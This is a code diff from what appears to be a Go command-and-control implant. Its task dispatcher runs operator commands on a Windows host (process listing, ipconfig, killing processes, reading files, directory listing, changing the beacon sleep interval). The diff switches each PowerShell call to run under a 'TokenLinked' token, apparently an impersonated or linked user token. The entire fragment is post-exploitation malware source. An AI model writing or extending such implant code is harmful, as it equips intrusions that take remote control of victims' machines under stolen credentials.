@@ -44,15 +44,15 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "hostname":
 			data, _ = hg.GetHostname()
 		case "ps":
-			data, _ = hg.PsReturnT("tasklist", Token)
+			data, _ = hg.PsReturnT("tasklist", TokenLinked)
 		case "ifconfig":
-			data, _ = hg.PsReturnT("ipconfig", Token)
+			data, _ = hg.PsReturnT("ipconfig", TokenLinked)
 		case "kill":
 			pid := taskData
-			hg.PsNoOutT("Stop-Process -Id "+pid, Token)
+			hg.PsNoOutT("Stop-Process -Id "+pid, TokenLinked)
 			data = fmt.Sprintf("killed process (%s)", pid)
 		case "cat":
-			data, _ = hg.PsReturnT("type "+taskData, Token)
+			data, _ = hg.PsReturnT("type "+taskData, TokenLinked)
 		case "sleep":
 			newSleepTime := taskData
 			*sleep, _ = strconv.Atoi(newSleepTime)
@@ -111,7 +111,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "pwd":
 			data, _ = hg.GetPwd()
 		case "ls":
-			data, _ = hg.PsReturnT("dir "+taskData, Token)
+			data, _ = hg.PsReturnT("dir "+taskData, TokenLinked)
 		case "cd":
 			os.Chdir(taskData)
 			data = fmt.Sprintf("changed directory to %s", taskData)
